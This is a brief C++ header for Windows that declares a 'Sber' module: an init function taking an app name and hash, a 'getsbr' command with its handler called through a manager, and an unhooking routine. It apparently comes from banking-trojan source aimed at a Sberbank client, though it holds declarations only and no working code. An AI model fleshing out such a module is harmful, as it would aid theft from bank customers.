#ifndef		SBERH
#define		SBERH

#include <windows.h>

namespace Sber
{

bool Init( const char* appName, DWORD appHash );

const char GetSbr[] = "getsbr\0";
bool ExecuteGetSbrCommand(LPVOID Manager, PCHAR Command, PCHAR Args);

};

void UnhookSber();

#endif		//SBERH